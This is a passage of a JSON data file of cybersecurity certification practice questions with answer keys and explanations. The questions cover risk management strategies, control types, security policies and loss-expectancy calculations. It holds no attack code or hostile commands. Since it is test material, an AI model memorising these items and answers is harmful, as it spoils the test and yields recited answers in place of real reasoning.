execution environment."],"a":0,"e":"Static code analysis requires access to the source code, meaning that the SAST tool will need to be compatible with all the languages that Michelle needs to have tested. Binary output language was made up for this question, while options C and D both refer to dynamic testing because the application would be run in both options.","l":"c8-appsec","l2":"","k":"SAST source code requirements"},{"id":"d2-251","set":"d2","ch":4,"d":2,"q":"Ken learns that an APT group is targeting his organization. What term best describes this situation?","o":["Risk","Threat","Countermeasure","Vulnerability"],"a":1,"e":"The advanced persistent threat (APT) group is an example of an external threat to the organization. If there is also some vulnerability in the organization’s security defenses that might allow that APT to successfully attack the organization, then a risk exists.","l":"c4-classify","l2":"c1-risk","k":"external threat actor definition"},{"id":"d2-252","set":"d2","ch":8,"d":2,"q":"Which one of the following activities is <i>least</i> likely to occur during the risk identification process?","o":["Network segmentation","Threat intelligence","Vulnerability scanning","System assessments"],"a":0,"e":"Network segmentation is a risk mitigation activity. Threat intelligence, vulnerability scanning, and systems assessments are all valuable tools in helping an organization identify risks.","l":"c8-analyzing","l2":"c8-controls","k":"risk identification phase activities"},{"id":"d2-253","set":"d2","ch":8,"d":2,"q":"What two factors are weighted most heavily when determining the severity of a risk?","o":["Likelihood and impact","Likelihood and probability","Magnitude and impact","Impact and control"],"a":0,"e":"The two factors that determine the severity of a risk are its likelihood and impact. Likelihood is a synonym for probability. Impact is a synonym for magnitude. Controls are a risk mitigation technique that might be applied to reduce the impact and/or likelihood after determining the severity of a risk.","l":"c8-analyzing","l2":"c1-risk","k":"risk severity likelihood and impact"},{"id":"d2-254","set":"d2","ch":8,"d":2,"q":"Preemployment background screening is an example of what type of security control?","o":["Detective","Preventive","Corrective","Compensating"],"a":1,"e":"This background screening is taking place prior to employment. Therefore, it is a preventive control, designed to prevent the organization from hiring someone who might pose a security risk.","l":"c8-controls","l2":"","k":"preventive security control classification"},{"id":"d2-255","set":"d2","ch":7,"d":2,"q":"Roland received a security assessment report from a third-party assessor, and it indicated that one of the organization’s web applications is susceptible to an OAuth redirect attack. What type of attack would this vulnerability allow an attacker to wage?\n<p><a href=\"#Que256\">Questions 256</a>–<a href=\"#Que259\">259</a> refer to the following scenario.</p>\n<p>Gary recently conducted a comprehensive security review of his organization. He identified the 25 top risks to the organization and is pursuing different risk management strategies for each of these risks. In some cases, he is using multiple strategies to address a single risk. His goal is to reduce the overall level of risk so that it lies within his organization’s risk tolerance.</p>","o":["Privilege escalation","Cross-site scripting","SQL injection","Impersonation"],"a":3,"e":"OAuth redirects are an authentication attack that allows an attacker to impersonate another user.","l":"c7-web-ot","l2":"c2-federation","k":"OAuth redirect impersonation attack"},{"id":"d2-256","set":"d2","ch":8,"d":2,"q":"Gary decides that the organization should integrate a threat intelligence feed with the firewall. What type of risk management strategy is this?","o":["Risk mitigation","Risk acceptance","Risk transference","Risk avoidance"],"a":0,"e":"The use of a threat intelligence feed to block connections at the firewall reduces the likelihood of a successful attack and is, therefore, a risk mitigation activity.","l":"c8-managing","l2":"c4-collect","k":"threat feed risk mitigation"},{"id":"d2-257","set":"d2","ch":8,"d":2,"q":"Gary discovers that his organization is storing some old files in a cloud service that are exposed to the world. He deletes those files. What type of risk management strategy is this?","o":["Risk mitigation","Risk acceptance","Risk transference","Risk avoidance"],"a":3,"e":"Gary is changing business practices to eliminate the risk entirely. This is, therefore, an example of risk avoidance.","l":"c8-managing","l2":"","k":"data elimination risk avoidance"},{"id":"d2-258","set":"d2","ch":8,"d":2,"q":"Gary is working with his financial team to purchase a cyber-liability insurance policy to cover the financial impact of a data breach. What type of risk management strategy is he using?","o":["Risk mitigation","Risk acceptance","Risk transference","Risk avoidance"],"a":2,"e":"Purchasing insurance is the most common example of risk transference—it’s shifting liability to a third party.","l":"c8-managing","l2":"","k":"cyber insurance risk transference"},{"id":"d2-259","set":"d2","ch":8,"d":2,"q":"Which one of the following risk management strategies is <i>most</i> likely to limit the likelihood of a risk occurring?","o":["Risk acceptance","Risk avoidance","Risk transference","Risk mitigation"],"a":1,"e":"This is a tricky question because two options—risk avoidance and risk mitigation—can both limit the likelihood of a risk occurring. However, risk avoidance is <i>more</i> likely to do so because it eliminates the circumstances that created the risk, whereas risk mitigation simply introduces controls to reduce the likelihood or impact of a risk. Risk acceptance does not change the likelihood or impact of a risk. Risk transference limits the potential impact by transferring financial responsibility to another organization but does not impact likelihood.","l":"c8-managing","l2":"","k":"risk avoidance strategy comparison"},{"id":"d2-260","set":"d2","ch":8,"d":2,"q":"Saanvi would like to reduce the likelihood of a data breach that affects sensitive personal information. Which one of the following compensating controls is <i>most</i> likely to achieve that objective?","o":["Minimizing the amount of data retained and the number of places where it is stored","Limiting the purposes for which data may be used","Purchasing cyber-risk insurance","Installing a new firewall"],"a":0,"e":"This question forces you to choose from several good options, as do many questions on the exam. We can rule out insurance because that does not alter the likelihood of a risk occurring. The remaining three options all do reduce the likelihood, but the best choice is minimizing the amount of data retained and the number of locations where it is stored, since this removes that data from the potential of a breach.","l":"c8-controls","l2":"c8-governance","k":"data minimization breach mitigation"},{"id":"d2-261","set":"d2","ch":8,"d":2,"q":"Kwame recently completed a risk assessment and is concerned that the level of residual risk exceeds his organization’s risk tolerance. What should he do next?\n<p><a href=\"#Que262\">Questions 262</a>–<a href=\"#Que267\">267</a> refer to the following scenario.</p>\n<p>Alan is a risk manager for Acme University, a higher education institution located in the western United States. He is concerned about the threat that an earthquake will damage his organization’s primary datacenter. He recently undertook a replacement cost analysis and determined that the datacenter is valued at $10 million.</p>\n<p>After consulting with seismologists, Alan determined that an earthquake is expected in the area of the datacenter once every 200 years. Datacenter specialists and architects helped him determine that an earthquake would likely cause $5 million in damage to the facility.</p>","o":["Have a discussion with his manager.","Implement new security controls.","Modify business processes to lower risk.","Purge data from systems."],"a":0,"e":"Kwame should take action to communicate the risk factors to management and facilitate a risk-informed discussion about possible courses of action. He should do this prior to taking any more aggressive action.","l":"c8-analyzing","l2":"c8-managing","k":"residual risk management communication"},{"id":"d2-262","set":"d2","ch":8,"d":2,"q":"Based on the information in this scenario, what is the exposure factor (EF) for the effect of an earthquake on Acme University’s datacenter?","o":["10 percent","25 percent","50 percent","75 percent"],"a":2,"e":"The exposure factor (EF) is the percentage of the facility that risk managers expect will be damaged if the risk materializes. It is calculated by dividing the amount of damage by the asset value. In this case, that is $5 million in damage divided by the $10 million facility value, or 50 percent.","l":"c8-analyzing","l2":"","k":"exposure factor percentage calculation"},{"id":"d2-263","set":"d2","ch":8,"d":2,"q":"Based on the information in this scenario, what is the annualized rate of occurrence (ARO) for an earthquake at the datacenter?","o":["0.0025","0.005","0.01","0.015"],"a":1,"e":"The annualized rate of occurrence (ARO) is the number of times that risk analysts expect a risk to happen in any given year. In this case, the analysts expect an earthquake once every 200 years, or 0.005 times per year.","l":"c8-analyzing","l2":"","k":"annualized rate of occurrence frequency"},{"id":"d2-264","set":"d2","ch":8,"d":2,"q":"Based on the information in this scenario, what is the annualized loss expectancy (ALE) for an earthquake at the datacenter?","o":["$25,000","$50,000","$250,000","$500,000"],"a":0,"e":"The annualized loss expectancy (ALE) is calculated by multiplying the single loss expectancy (SLE) by the annualized rate of occurrence (ARO). In this case, the SLE is $5,000,000 and the ARO is 0.005. Multiplying these numbers together gives you the ALE of $25,000.","l":"c8-analyzing","l2":"","k":"annualized loss expectancy formula"},{"id":"d2-265","set":"d2","ch":8,"d":2,"q":"Referring to the previous scenario, if Alan’s organization decides to move the datacenter to a location where earthquakes are not a risk, what risk management strategy are they using?","o":["Risk mitigation","Risk avoidance","Risk acceptance","Risk transference"],"a":1,"e":"Moving the datacenter to a location where earthquakes are not a risk is an example of risk avoidance, because it is completely avoiding the risk. If the location simply had a lower risk of earthquake, then this strategy would be risk mitigation.","l":"c8-managing","l2":"","k":"datacenter relocation risk avoidance"},{"id":"d2-266","set":"d2","ch":8,"d":2,"q":"Referring to the previous scenario, if the organization decides not to relocate the datacenter but instead purchases an insurance policy to cover the replacement cost of the datacenter, what risk management strategy are they using?","o":["Risk mitigation","Risk avoidance","Risk acceptance","Risk transference"],"a":3,"e":"Purchasing insurance is always an example of risk transference, as it transfers risk from the entity purchasing the policy to the insurance company.","l":"c8-managing","l2":"","k":"insurance policy risk transference"},{"id":"d2-267","set":"d2","ch":8,"d":2,"q":"Referring to the previous scenario, assume that the organization decides that relocation is too difficult and the insurance is too expensive. They instead decide that they will carry on despite the risk of earthquake and handle the impact if it occurs. What risk management strategy are they using?","o":["Risk mitigation","Risk avoidance","Risk acceptance","Risk transference"],"a":2,"e":"Risk acceptance is the deliberate decision to not take any other risk management action and simply to carry on with normal activity in spite of the risk.","l":"c8-managing","l2":"","k":"deliberate risk acceptance decision"},{"id":"d2-268","set":"d2","ch":8,"d":2,"q":"Colin would like to implement a detective security control in his accounting department, which is specifically designed to identify cases of fraud that are able to occur despite the presence of other security controls. Which one of the following controls is best suited to meet Colin’s need?","o":["Separation of duties","Least privilege","Dual control","Mandatory vacations"],"a":3,"e":"Mandatory vacations are designed to force individuals to take time away from the office to allow fraudulent activity to come to light in their absence. The other controls listed here (separation of duties, least privilege, and dual control) are all designed to prevent, rather than detect, fraud.","l":"c8-controls","l2":"","k":"mandatory vacation detective control"},{"id":"d2-269","set":"d2","ch":8,"d":2,"q":"Rob is an auditor reviewing the managerial controls used in an organization. He is examining the payment process used by the company to issue checks to vendors. He notices that Helen, a staff accountant, is the person responsible for creating new vendors. Norm, another accountant, is responsible for issuing payments to vendors. Helen and Norm are cross-trained to provide backup for each other. What security issue, if any, exists in this situation?","o":["Least privilege violation","Separation of duties violation","Dual control violation","No issue"],"a":1,"e":"This situation violates the principle of separation of duties. The company appears to have designed the controls to separate the creation of vendors from the issuance of payments, which is a good fraud-reduction practice. However, the fact that they are cross-trained to back each other up means that they have the permissions assigned to violate this principle.","l":"c8-controls","l2":"c8-governance","k":"separation of duties principle"},{"id":"d2-270","set":"d2","ch":8,"d":2,"q":"Mei recently completed a risk management review and identified that the organization is susceptible to an on-path (also known as man-in-the-middle) attack. After review with her manager, they jointly decided that accepting the risk is the most appropriate strategy. What should Mei do next?","o":["Implement additional security controls.","Design a remediation plan.","Repeat the business impact assessment.","Document the decision."],"a":3,"e":"After accepting a risk, the organization takes no action other than to document the risk as accepted. Implementing additional security controls or designing a remediation plan would not be risk acceptance but would instead fit into the category of risk mitigation. There is no need to repeat the business impact assessment.","l":"c8-managing","l2":"","k":"documenting accepted risk decisions"},{"id":"d2-271","set":"d2","ch":8,"d":2,"q":"Robin is planning to conduct a risk assessment in her organization. She is concerned that it will be difficult to perform the assessment because she needs to include information about both tangible and intangible assets. What would be the most effective risk assessment strategy for her to use?","o":["Quantitative risk assessment","Qualitative risk assessment","Combination of quantitative and qualitative risk assessment","Neither quantitative nor qualitative risk assessment"],"a":2,"e":"Robin would achieve the best results by combining elements of quantitative and qualitative risk assessment. Quantitative risk assessment excels at analyzing tangible, financial risks, whereas qualitative risk assessment is good for intangible risks. Combining the two techniques provides a well-rounded risk picture.","l":"c8-analyzing","l2":"","k":"hybrid quantitative qualitative risk assessment"},{"id":"d2-272","set":"d2","ch":8,"d":2,"q":"A legacy business application has a serious vulnerability, but no vendor patch exists. The business decides to continue operating the system while implementing network segmentation and strict access controls to reduce exposure, acknowledging some remaining exposure. Which risk management strategy is the organization applying?","o":["Mitigate","Avoid","Accept","Transfer"],"a":0,"e":"This scenario reflects a mitigate strategy because the organization is keeping the vulnerable legacy system in use while actively reducing the likelihood and impact of exploitation through network segmentation and strict access controls, which are classic risk reduction measures that leave some residual risk. Avoid would require eliminating the risk entirely by shutting down or replacing the application rather than continuing to operate it. Accept would involve formally acknowledging the risk without putting additional technical or procedural controls in place to reduce it. Transfer would shift some or all of the financial impact to a third party such as a cyber-insurance provider or outsourced service, which is not what is happening here.","l":"c8-managing","l2":"c8-controls","k":"compensating control risk mitigation"},{"id":"d2-273","set":"d2","ch":2,"d":2,"q":"Vlad’s organization recently underwent a security audit that resulted in a finding that the organization fails to promptly remove the accounts associated with users who have left the organization. This resulted in at least one security incident where a terminated user logged in to a corporate system and took sensitive information. What identity and access management control would best protect against this risk?","o":["Automated deprovisioning","Quarterly user account reviews","Separation of duties","Two-person control"],"a":0,"e":"Automated deprovisioning ties user account removal to human resources systems. Once a user is terminated in the human resources system, the identity and access management infrastructure automatically removes the account. Quarterly user access reviews may identify accounts that should have been disabled, but they would take a long time to do so, so they are not the best solution to the problem. Separation of duties and two-person control are designed to limit the authority of a user account and would not remove access.","l":"c2-iam","l2":"c8-controls","k":"automated account deprovisioning"},{"id":"d2-274","set":"d2","ch":8,"d":2,"q":"Jay is the CISO for his organization and is responsible for conducting periodic reviews of the organization’s information security policy. The policy was written 3 years ago and has undergone several minor revisions after audits and assessments. Which one of the following would be the most reasonable frequency to conduct formal reviews of the policy?","o":["Monthly","Quarterly","Annually","Every 5 years"],"a":2,"e":"Annual reviews of security policies are an industry standard and are sufficient unless there are special circumstances, such as a new policy or major changes in the environment. Monthly or quarterly reviews would occur too frequently, whereas waiting 5 years for the review is likely to miss important changes in the environment.","l":"c8-governance","l2":"","k":"security policy annual review"},{"id":"d2-275","set":"d2","ch":8,"d":2,"q":"Terri is undertaking a risk assessment for her organization. Which one of the following activities would normally occur first?","o":["Risk identification","Risk calculation","Risk mitigation","Risk management"],"a":0,"e":"The first step in performing a risk assessment is to undertake the risk identification process.","l":"c8-analyzing","l2":"c1-risk","k":"risk identification initial step"},{"id":"d2-276","set":"d2","ch":8,"d":2,"q":"Kai is attempting to determine whether he can destroy a cache of old records that he discovered. What type of policy would most directly answer his question?","o":["Data ownership","Data classification","Data minimization","Data retention"],"a":3,"e":"The most relevant policy here is the organization’s data retention policy, which should outline the standards for keeping records before destruction or disposal.","l":"c8-governance","l2":"","k":"data retention policy guidelines"},{"id":"d2-277","set":"d2","ch":8,"d":2,"q":"Fences are a widely used security control that can be described by several different control types. Which one of the following control types would <i>least</i> describe a fence?","o":["Deterrent","Corrective","Preventive","Physical"],"a":1,"e":"Fences are preventive controls because a tall fence can prevent an intruder from gaining access to a secure facility. They are also deterrent controls because the presence of a fence may deter an intruder from attempting to gain access. They are physical security controls because they restrict physical access. They are not corrective controls because they do not play a role after a physical intrusion occurs.","l":"c8-controls","l2":"","k":"physical perimeter preventive controls"},{"id":"d2-278","set":"d2","ch":8,"d":2,"q":"Ian is designing an authorization scheme for his organization’s deployment of a new accounting system. He is considering putting a control in place that would require that two accountants approve any payment request over $100,000. What security principle is Ian seeking to enforce?","o":["Security through obscurity","Least privilege","Separation of duties","Dual control"],"a":3,"e":"It is sometimes difficult to distinguish between cases of least privilege, separation of duties, and dual control. Least privilege means that an employee should only have the access rights necessary to perform their job. That is not the case in this scenario because accountants need to be able to approve payments. Separation of duties occurs when the same employee does not have permission to perform two different actions that, when combined, could undermine security. That is not the case here because both employees are performing the same action: approving the payment. Dual control occurs when two employees must jointly authorize the same action. That is the case in this scenario. Security through obscurity occurs when the security of a control depends on the secrecy of its mechanism.","l":"c8-controls","l2":"c2-iam","k":"dual control authorization scheme"},{"id":"d2-279","set":"d2","ch":8,"d":2,"q":"A vendor provides a critical application used by your organization. A new vulnerability is announced in a widely used open source library, and leadership wants to know immediately whether the vendor’s product includes the affected component and version. What should the analyst request to best support rapid impact analysis?","o":["SBOM","DAST","SAST","Packet captures"],"a":0,"e":"A software bill of materials is the best request because it provides a structured inventory of all components, including third-party and open source libraries with their versions, allowing a quick check to see whether the vulnerable library and version are present in the vendor’s product. Dynamic application security testing evaluates the running application’s behavior and would not directly or quickly reveal specific internal library versions in use. Static application security testing examines source or build artifacts, but that is something the vendor would perform internally rather than something you can easily request and parse on demand for rapid impact analysis. Packet captures show network traffic and protocol details, which are useful for troubleshooting and some security investigations, but they do not provide a reliable way to enumerate internal software components and versions inside a packaged application.","l":"c8-appsec","l2":"","k":"software bill of materials inventory"},{"id":"d2-280","set":"d2","ch":8,"d":2,"q":"Gavin is drafting a document that provides a detailed step-by-step process that users may follow to connect to the VPN from remote locations. Alternatively, users may ask IT to help them configure the connection. What term best describes this document?","o":["Policy","Procedure","Standard","Guideline"],"a":1,"e":"A procedure offers a step-by-step process for completing a cybersecurity activity. The VPN instructions that Gavin is creating are best described using this term.","l":"c8-governance","l2":"","k":"step-by-step security procedure"},{"id":"d2-281","set":"d2","ch":8,"d":2,"q":"Which one of the following security controls is designed to help provide continuity for security responsibilities?","o":["Succession planning","Separation of duties","Mandatory vacation","Dual control"],"a":0,"e":"Succession planning is designed to create a pool of reserve candidates ready to step into positions when a vacancy occurs. This is an important continuity control. The other security controls may have the incidental side effect of exposing employees to other responsibilities, but they are not designed to meet this goal.","l":"c8-controls","l2":"","k":"succession planning operational continuity"},{"id":"d2-282","set":"d2","ch":8,"d":2,"q":"After conducting a security review, Oskar determined that his organization is not conducting regular backups of critical data. What term best describes the type of control gap that exists in Oskar’s organization?","o":["Preventive","Corrective","Detective","Deterrent"],"a":1,"e":"Backups are used to recover operations in the wake of a security incident. Therefore, they are best described as corrective controls.","l":"c8-controls","l2":"c11-recover","k":"data backups corrective control"},{"id":"d2-283","set":"d2","ch":8,"d":2,"q":"Carla is reviewing the cybersecurity policies used by her organization. What policy might she put in place as a failsafe to cover employee behavior situations where no other policy directly applies?","o":["Data monitoring policy","Account management policy","Code of conduct","Data ownership policy"],"a":2,"e":"An organization’s code of conduct or ethics describes expected behavior of employees and affiliates and serves as a backstop for situations not specifically addressed in policy.","l":"c8-governance","l2":"","k":"organizational code of conduct"},{"id":"d2-284","set":"d2","ch":8,"d":2,"q":"Which one of the following items is <i>not</i> normally included in a request for an exception to security policy?","o":["Description of a compensating control","Description of the risks associated with the exception","Proposed revision to the security policy","Business justification for the exception"],"a":2,"e":"Requests for an exception to a security policy would not normally include a proposed revision to the policy. Exceptions are documented variances from the policy because of specific technical and/or business requirements. They do not alter the original policy, which remains in force for systems not covered by the exception.","l":"c8-governance","l2":"","k":"policy exception request contents"},{"id":"d2-285","set":"d2","ch":8,"d":2,"q":"What policy should contain provisions for removing user access upon termination?\n<p><a href=\"#Que286\">Questions 286</a>–<a href=\"#Que288\">288</a> refer to the following scenario:</p>\n<p>Karen is the CISO of a major manufacturer of industrial parts. She is currently performing an assessment of the firm’s financial controls, with an emphasis on implementing security practices that will reduce the likelihood of theft from the firm.</p>","o":["Data ownership policy","Data classification policy","Data retention policy","Account management policy"],"a":3,"e":"Account management policies describe the account life cycle from provisioning through active use and decommissioning, including removing access upon termination. Data ownership policies clearly state the ownership of information created or used by the organization. Data classification policies describe the classification structure used by the organization and the process used to properly assign classifications to data. Data retention policies outline what information the organization will maintain and the length of time different categories of information will be retained prior to destruction.","l":"c8-governance","l2":"c2-iam","k":"account management termination policy"},{"id":"d2-286","set":"d2","ch":8,"d":2,"q":"Karen would like to ensure that the same individual is not able to both create a new vendor in the system and authorize a payment to that vendor. She is concerned that an individual who could perform both of these actions would be able to send payments to false vendors. What type of control should Karen implement?","o":["Mandatory vacations","Separation of duties","Job rotation","Two-person control"],"a":1,"e":"Separation of duties is a principle that prevents individuals from having two different privileges that, when combined, could be misused. Separating the ability to create vendors and authorize payments is an example of separation of duties. Mandatory vacations may help reveal fraudulent activity by forcing someone else to perform the job temporarily, but they do not prevent the conflict in the first place. Job rotation similarly changes assignments over time and may expose abuse, yet it does not ensure incompatible tasks are split between different people. Two-person control requires two individuals to participate in a sensitive activity, but it is not as specifically focused on preventing one person from controlling the full vendor creation and payment process as separation of duties is.","l":"c8-controls","l2":"","k":"separation of duties enforcement"},{"id":"d2-287","set":"d2","ch":8,"d":2,"q":"The accounting department has a policy that requires the signatures of two individuals on checks valued over $5,000. What type of control do they have in place?","o":["Mandatory vacations","Separation of duties","Job rotation","Two-person control"],"a":3,"e":"Two-person control is a principle that requires the concurrence of two different employees to perform a single sensitive action. Requiring two signatures on a check is an example of a two-person control.","l":"c8-controls","l2":"","k":"two-person control requirement"},{"id":"d2-288","set":"d2","ch":8,"d":2,"q":"Karen would also like to implement controls that would help detect potential malfeasance by existing employees. Which one of the following controls is <i>least</i> likely to detect malfeasance?","o":["Mandatory vacations","Background investigations","Job rotation","Privilege use reviews"],"a":1,"e":"Mandatory vacations and job rotation plans are able to detect malfeasance by requiring an employee’s absence from his or her normal duties and exposing them to other employees. Privilege use reviews have a manager review the actions of an employee with privileged system access and would detect misuse of those privileges. Background investigations uncover past acts and would not be helpful in detecting active fraud. They are also typically performed only for new hires.","l":"c8-controls","l2":"","k":"mandatory vacations detecting fraud"},{"id":"d2-289","set":"d2","ch":12,"d":2,"q":"A security program is formalizing vulnerability management expectations. Executives want a clear internal target for how quickly critical vulnerabilities should be remediated, and they want the SOC and infrastructure teams measured against that target. What should the analyst define to meet this requirement?","o":["SLO","Vulnerability disclosure policy","Threat model","Change freeze"],"a":0,"e":"Defining a service level objective (SLO) meets this requirement because an SLO sets a specific, measurable internal target such as “remediate critical vulnerabilities within <i>X</i> days,” which executives can use to track and evaluate SOC and infrastructure team performance. A vulnerability disclosure policy governs how external researchers and third parties report vulnerabilities to the organization—not how quickly internal teams must fix them. A threat model describes potential adversaries, attack paths, and assets at risk, which informs prioritization but does not create measurable remediation time goals. A change freeze is a temporary halt on changes to production systems, often around peak business periods, and would actually conflict with rapid remediation goals rather than define them.","l":"c12-vuln-report","l2":"c6-remediation","k":"service level objective targets"},{"id":"d2-290","set":"d2","ch":8,"d":2,"q":"Bohai is concerned about access to the main account for a cloud service that his company uses to manage payment transactions. He decides to implement a new process for multifactor authentication to that account where an individual on the IT team has the password to the account, while an individual in the accounting group has the token. What security principle is Bohai using?","o":["Dual control","Separation of duties","Least privilege","Security through obscurity"],"a":0,"e":"This is an example of dual control (or two-person control) where performing a sensitive action (logging onto the payment system) requires the cooperation of two individuals. Separation of duties is related but would involve not allowing the same person to perform two actions that, when combined, could be harmful.","l":"c8-controls","l2":"c2-iam","k":"cloud administrator dual control"},{"id":"d2-291","set":"d2","ch":1,"d":2,"q":"Tina is preparing for a penetration test and is working with a new vendor. She wants to make sure that the vendor understands exactly what technical activities are permitted within the scope of the test. Where should she document these requirements?","o":["MOA","Contract","RoE","SLA"],"a":2,"e":"The rules of engagement (RoE) for a penetration test outline the permissible and impermissible activities for testers. If there are any systems, techniques, or information that is off-limits, this should be clearly stated in the RoE.","l":"c1-endpoint-pentest","l2":"","k":"penetration test rules of engagement"},{"id":"d2-292","set":"d2","ch":8,"d":2,"q":"Azra is reviewing a draft of the Domer Doodads information security policy and finds that it contains the following statements. Which one of these statements would be more appropriately placed in a different document?","o":["Domer Doodads designates the chief information security officer as the individual with primary responsibility for information security.","The chief information security officer is granted the authority to create specific requirements that implement this policy.","All access to financial systems must use multifactor authentication for remote connections.","Domer Doodads considers cybersecurity and compliance to be of critical importance to the business."],"a":2,"e":"It is normal to find statements in an information security policy that declare the importance of cybersecurity to the organization, designate a specific individual as responsible for the cybersecurity function, and grant that individual authority over cybersecurity. Specific requirements, such as requiring multifactor authentication for financial systems would be more appropriately placed in a standard than a policy.","l":"c8-governance","l2":"","k":"information security policy statements"},{"id":"d2-293","set":"d2","ch":8,"d":2,"q":"Which one of the following security policy framework documents <i>never</i> includes mandatory employee compliance?","o":["Policy","Guideline","Procedure","Standard"],"a":1,"e":"Guidelines are optional advice, by definition. Policies, standards, and procedures are mandatory.","l":"c8-governance","l2":"","k":"security guidelines advisory nature"},{"id":"d2-294","set":"d2","ch":6,"d":2,"q":"A security engineering team wants to safely emulate adversary behavior in a test environment to validate whether existing detections and response playbooks trigger as expected. The team also wants the activity to be repeatable so they can measure improvement over time. Which tool best supports this requirement?\n<p><a href=\"#Que295\">Questions 295</a>–<a href=\"#Que299\">299</a> refer to the following scenario.</p>\n<p>Seamus is conducting a business impact assessment (BIA) for his organization. He is attempting to determine the risk associated with a denial-of-service attack against his organization’s datacenter.</p>\n<p>Seamus consulted with various subject-matter experts (SMEs) and determined that the attack would not cause any permanent damage to equipment, applications, or data. The primary damage would come in the form of lost revenue. Seamus believes that the organization would lose $75,000 in revenue during a successful attack.</p>\n<p>Seamus also consulted with his threat management vendor, who considered the probability of a successful attack against his organization and determined that there is a 10 percent chance of a successful attack in the next 12 months.</p>","o":["Nessus","Caldera","Nmap","Burp suite"],"a":1,"e":"Caldera is the best fit because it is designed for automated adversary emulation that chains techniques in a way similar to real attackers, allowing the team to repeatedly run the same campaigns, verify that detections and playbooks fire, and track improvement over time. Nessus focuses on vulnerability scanning to identify missing patches and misconfigurations, not on simulating attack behaviors across the kill chain. Nmap is primarily a network discovery and port scanning tool that maps hosts and services, which can support reconnaissance but does not provide structured, repeatable adversary emulation or detection testing. Burp Suite is aimed at web application security testing, helping find and exploit web-specific flaws, rather than orchestrating broader endpoint and network behaviors that test SOC detections and response workflows.","l":"c6-tools","l2":"","k":"Caldera automated adversary emulation"},{"id":"d2-295","set":"d2","ch":8,"d":2,"q":"What is the ARO for this assessment?","o":["8 percent","10 percent","12 percent","100 percent"],"a":1,"e":"The annualized rate of occurrence (ARO) is calculated as the number of times an attack should be expected in a given year. This may be expressed as a decimal or percentage. The scenario tells us that there is a 10 percent chance of an attack in a given year. This could be described as an ARO of 10 percent, or 0.1.","l":"c8-analyzing","l2":"","k":"annualized rate of occurrence probability"},{"id":"d2-296","set":"d2","ch":8,"d":2,"q":"What is the SLE for this scenario?","o":["$625","$6,250","$7,500","$75,000"],"a":3,"e":"The single loss expectancy (SLE) is the amount of damage expected to occur as the result of a single successful attack. In this case, the scenario provides this information as $75,000.","l":"c8-analyzing","l2":"","k":"single loss expectancy calculation"},{"id":"d2-297","set":"d2","ch":8,"d":2,"q":"What is the ALE for this scenario?","o":["$625","$6,250","$7,500","$75,000"],"a":2,"e":"The annualized loss expectancy (ALE) is the amount of damage expected in any given year. It is calculated by multiplying the SLE ($75,000) by the ARO (10 percent) to get the ALE ($7,500).","l":"c8-analyzing","l2":"","k":"annualized loss expectancy product"},{"id":"d2-298","set":"d2","ch":8,"d":2,"q":"Seamus is considering purchasing a DDoS protection system that would reduce the likelihood of a successful attack. What type of control is he considering?","o":["Detective","Corrective","Preventive","Deterrent"],"a":2,"e":"Determining the single best category for a control is always tricky, as many controls can cross categories in terms of their purpose. In this case, we are told that the control exists to reduce the likelihood of a successful attack, making it a preventive control.","l":"c8-controls","l2":"c8-managing","k":"DDoS mitigation preventive control"},{"id":"d2-299","set":"d2","ch":8,"d":2,"q":"Seamus wants to make sure that he can accurately describe the category of the DDoS protection service to auditors. Which term best describes the category of this control?\n<p><a href=\"#Que300\">Questions 300</a> and <a href=\"#Que301\">301</a> refer to the following scenario:</p>\n<p>Piper’s organization handles credit card information and is, therefore, subject to the Payment Card Industry Data Security Standard (PCI DSS). She is working to implement the PCI DSS requirements.</p>","o":["Compensating","Physical","Operational","Technical"],"a":3,"e":"A DDoS mitigation service takes action to reduce the load on the network by blocking unwanted traffic. This is a technical intervention and is best described as a technical control.","l":"c8-controls","l2":"","k":"technical security control classification"},{"id":"d2-300","set":"d2","ch":8,"d":2,"q":"As Piper attempts to implement PCI DSS requirements, she discovers that she is unable to meet one of the requirements because of a technical limitation in her point-of-sale system. She decides to work with regulators to implement a second layer of logical isolation to protect this system from the Internet to allow its continued operation despite not meeting one of the requirements. What term best describes the type of control Piper has implemented?","o":["Physical control","Operational control","Compensating control","Deterrent control"],"a":2,"e":"PCI DSS allows organizations that cannot meet a specific PCI DSS requirement to implement a compensating control that mitigates the risk. This is the process Piper is following in this scenario.","l":"c8-governance","l2":"c6-requirements","k":"PCI DSS compensating controls"},{"id":"d2-301","set":"d2","ch":8,"d":2,"q":"When Piper implements this new isolation technology, what type of risk management action is she taking?","o":["Risk acceptance","Risk avoidance","Risk transference","Risk mitigation"],"a":3,"e":"The purpose of this control is to reduce the likelihood of a successful attack. Implementing controls designed to reduce the likelihood or impact of a risk is a risk mitigation activity.","l":"c8-managing","l2":"c8-controls","k":"risk mitigation control implementation"},{"id":"d2-302","set":"d2","ch":8,"d":2,"q":"Ruth is helping a business leader determine the appropriate individuals to consult about sharing information with a third-party organization. Which one of the following policies would likely contain the most relevant guidance for her?","o":["Data retention policy","Information security policy","Data validation policy","Data ownership policy"],"a":3,"e":"Sharing data outside the organization normally requires the consent of the data owner. Ruth should consult the data ownership policy for assistance in determining the identities of the appropriate data owner(s) that she should consult.","l":"c8-governance","l2":"","k":"data ownership policy authorization"},{"id":"d2-303","set":"d2","ch":8,"d":2,"q":"Samantha is investigating a cybersecurity incident where an internal user used his computer to participate in a denial-of-service attack against a third party. What type of policy was most likely violated?","o":["AUP","SLA","BCP","Information classification policy"],"a":0,"e":"This activity is almost certainly a violation of the organization’s acceptable use policy (AUP), which should contain provisions describing appropriate use of networks and computing resources belonging to the organization.","l":"c8-governance","l2":"","k":"acceptable use policy violations"},{"id":"d2-304","set":"d2","ch":8,"d":2,"q":"Ryan is compiling a list of allowable encryption algorithms for use in his organization. What type of document would be most appropriate for this list?","o":["Policy","Standard","Guideline","Procedure"],"a":1,"e":"Standards describe specific security controls that must be in place for an organization. Ryan would not include a list of algorithms in a high-level policy document, and this information is too general to be useful as a procedure. Guidelines are not mandatory, so they would not be applicable in this scenario.","l":"c8-governance","l2":"c2-crypto","k":"cryptographic algorithm security standards"},{"id":"d2-305","set":"d2","ch":8,"d":2,"q":"During the design of an identity and access management authorization scheme, Katie took steps to ensure that members of the security team who can approve database access requests do not have access to the database themselves. What security principle is Katie most directly enforcing?","o":["Least privilege","Separation of duties","Dual control","Security through obscurity"],"a":1,"e":"It is sometimes difficult to distinguish between cases of least privilege, separation of duties, and dual control. Least privilege means that an employee should only have the access rights necessary to perform their job. While this may be true in this scenario, you do not have enough information to make that determination because you do not know whether access to the database would help the security team perform their duties. Separation of duties occurs when the same employee does not have permission to perform two different actions that, when combined, could undermine security. That is the case here because a team member who had the ability to both approve access and 